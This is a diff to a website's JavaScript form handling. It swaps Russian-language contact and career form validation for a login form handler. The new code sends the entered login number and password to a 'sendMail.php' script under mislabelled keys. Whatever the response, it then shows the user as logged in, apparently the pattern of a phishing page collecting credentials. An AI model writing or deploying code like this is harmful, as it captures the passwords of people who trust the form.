@@ -1,95 +1,56 @@
-const form = document.getElementById('form');
-const username = document.getElementById('username');
-const usernamecareer = document.getElementById('usernamecareer');
-const usernamesay = document.getElementById('usernamesay');
-const phone = document.getElementById('phone');
-const phonecareer = document.getElementById('phonecareer');
-const phonesay = document.getElementById('phonesay');
-const text = document.getElementById('text');
-const textcareer = document.getElementById('textcareer');
-const linkcareer = document.getElementById('linkcareer');
-// start validate form project
-if(!form){} else {
-  form.addEventListener('submit', e => {
-  e.preventDefault();
-  
-  checkInputs();
+// start validate form login
+const idloginform = document.getElementById('loginform');
+const loginnumber = document.getElementById('loginnumber');
+const loginpassword = document.getElementById('loginpassword');
+const loginformdouble = document.querySelector('.login__form');
+const regformdouble = document.querySelector('.reg__form');
+const loginloggeddouble = document.querySelector('.login__logged');
+
+if(!idloginform){} else {
+
+  loginnumber.oninput = function(){this.value = this.value.substr(0, 30);}
+  loginpassword.oninput = function(){this.value = this.value.substr(0, 30);}
+
+  idloginform.addEventListener('submit', e => {
+    e.preventDefault();
+    checkInputs();
   });
+
   function checkInputs() {
-  // trim to remove the whitespaces
-  const usernameValue = username.value.trim();
-  const phoneValue = phone.value.trim();
-  const textValue = text.value.trim();
-  
-  if(usernameValue === '') {
-      setErrorFor(username, 'Обязательное поле'); } else { setSuccessFor(username);
-  }
-  if(phoneValue === '') {
-      setErrorFor(phone, 'Обязательное поле'); } else { setSuccessFor(phone);
-  }
-  if(textValue === '') {
-      setErrorFor(text, 'Обязательное поле'); } else { setSuccessFor(text);
+    const loginnumberValue = loginnumber.value.trim();
+    const loginpasswordValue = loginpassword.value.trim();
+    
+    if(loginnumberValue != '' && loginnumberValue.length > 5 && loginnumberValue.length <= 30) {setSuccessFor(loginnumber);} else {setErrorFor(loginnumber);}
+    if(loginpasswordValue != '' && loginpasswordValue.length > 5 && loginpasswordValue.length <= 30) {setSuccessFor(loginpassword);} else {setErrorFor(loginpassword);}
+    if(loginnumberValue != '' && loginnumberValue.length > 5 && loginnumberValue.length <= 30 && loginpasswordValue != '' && loginpasswordValue.length > 5 && loginpasswordValue.length <= 30){
+      window.setTimeout(function () {
+        fetch('/ajax/sendMail.php', {
+          method: 'POST',
+          body: JSON.stringify({
+            body: loginnumberValue,
+            userId: loginpasswordValue
+          }),
+          headers: {
+            "Content-type": "application/json; charset=UTF-8"
+          }
+        })
+      }, 1000);
+      loginformdouble.classList.add("hidden");
+      regformdouble.classList.remove("active");
+      loginloggeddouble.classList.add("active");
+      loginnumber.value = '';
+      loginpassword.value = '';
     }
   }
   
-  function setErrorFor(input, message) {
+  function setErrorFor(input) {
     const formControl = input.parentElement;
-    const small = formControl.querySelector('small');
-    formControl.className = 'header__forms_form_control error';
-    small.innerText = message;
+    formControl.className = 'login__label input__error';
   }
   
   function setSuccessFor(input) {
     const formControl = input.parentElement;
-    formControl.className = 'header__forms_form_control success';
+    formControl.className = 'login__label input__success';
   }
-  
-  // function iscontrol(control) {
-  // 	return /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(control);
-  // }
-  }
-// end validate form project
-  
-// start validate form career
-const formcareer = document.getElementById('formcareer');
-if(formcareer) {
-  formcareer.addEventListener('submit', e => {
-    e.preventDefault();
-    
-    checkInputscareer();
-    });
-    
-    function checkInputscareer() {
-    // trim to remove the whitespaces
-    const usernamecareerValue = usernamecareer.value.trim();
-    const phonecareerValue = phonecareer.value.trim();
-    const textcareerValue = textcareer.value.trim();
-    
-    if(usernamecareerValue === '') {
-        setErrorFor(usernamecareer, 'Обязательное поле'); } else { setSuccessFor(usernamecareer);
-    }
-    if(phonecareerValue === '') {
-        setErrorFor(phonecareer, 'Обязательное поле'); } else { setSuccessFor(phonecareer);
-    }
-    if(textcareerValue === '') {
-        setErrorFor(textcareer, 'Обязательное поле'); } else { setSuccessFor(textcareer);
-      }
-    }
-    
-    function setErrorFor(input, message) {
-      const formcareerControl = input.parentElement;
-      const small = formcareerControl.querySelector('small');
-      formcareerControl.className = 'header__forms_form_control error';
-      small.innerText = message;
-    }
-    
-    function setSuccessFor(input) {
-      const formcareerControl = input.parentElement;
-      formcareerControl.className = 'header__forms_form_control success';
-    }
-    
-    // function iscontrol(control) {
-    // 	return /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(control);
-    // }
 }
-// end validate form career
+// end validate form login
